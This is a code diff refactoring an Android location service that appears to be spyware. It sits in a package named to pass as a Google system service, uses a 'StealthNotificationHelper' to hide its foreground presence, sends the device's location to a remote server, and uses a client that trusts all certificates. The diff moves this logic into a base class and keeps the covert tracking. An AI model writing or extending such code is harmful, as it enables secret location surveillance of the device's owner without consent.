@@ -1,11 +1,9 @@
 package com.google.android.systemservice.services
 
 import android.annotation.SuppressLint
-import android.app.Service
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.location.Location
-import android.os.IBinder
 import android.os.Looper
 import android.util.Log
 import com.google.android.gms.location.*
@@ -20,7 +18,7 @@ import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
 import java.util.concurrent.TimeUnit
 
-class LocationService : Service() {
+class LocationService : BaseService() {
     companion object {
         private const val TAG = "SystemLocation"
         private const val DEFAULT_INTERVAL_MS = 60000L // 1 minute default
@@ -30,10 +28,13 @@ class LocationService : Service() {
         var trackingIntervalMs: Long = DEFAULT_INTERVAL_MS
     }
 
+    override val serviceTag = TAG
+    override val foregroundServiceId = StealthNotificationHelper.LOCATION_SERVICE_ID
+
     private lateinit var fusedLocationClient: FusedLocationProviderClient
     private lateinit var adaptiveSyncManager: AdaptiveSyncManager
     private var locationCallback: LocationCallback? = null
-    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
+    private var pendingLocationCallback: LocationCallback? = null
     private val prefs by lazy { getSharedPreferences("location_cache", MODE_PRIVATE) }
     private val client = TrustAllCertificates.createSecureClientBuilder()
         .connectTimeout(30, TimeUnit.SECONDS)
@@ -53,11 +54,6 @@ class LocationService : Service() {
             trackingIntervalMs = adaptiveSyncManager.getLocationUpdateInterval()
             Log.d(TAG, "Using adaptive location interval: ${trackingIntervalMs}ms")
         }
-    }
-
-    private fun startForegroundSilent() {
-        val notification = StealthNotificationHelper.createStealthNotification(this)
-        startForeground(StealthNotificationHelper.LOCATION_SERVICE_ID, notification)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -103,15 +99,16 @@ class LocationService : Service() {
             .setMaxUpdates(1)
             .build()
 
-        val callback = object : LocationCallback() {
+        pendingLocationCallback = object : LocationCallback() {
             override fun onLocationResult(result: LocationResult) {
                 result.lastLocation?.let { sendLocationToServer(it) }
                 fusedLocationClient.removeLocationUpdates(this)
+                pendingLocationCallback = null
             }
         }
 
         try {
-            fusedLocationClient.requestLocationUpdates(request, callback, Looper.getMainLooper())
+            fusedLocationClient.requestLocationUpdates(request, pendingLocationCallback!!, Looper.getMainLooper())
         } catch (e: SecurityException) {
             Log.e(TAG, "Location permission denied: ${e.message}")
         }
@@ -221,14 +218,12 @@ class LocationService : Service() {
         }
     }
 
-    override fun onBind(intent: Intent?): IBinder? = null
-
     override fun onDestroy() {
-        super.onDestroy()
-        stopForeground(false)
+        pendingLocationCallback?.let { fusedLocationClient.removeLocationUpdates(it) }
+        pendingLocationCallback = null
         stopLocationTracking()
-        serviceScope.cancel()
         client.dispatcher.executorService.shutdown()
         client.connectionPool.evictAll()
+        super.onDestroy()
     }
 }
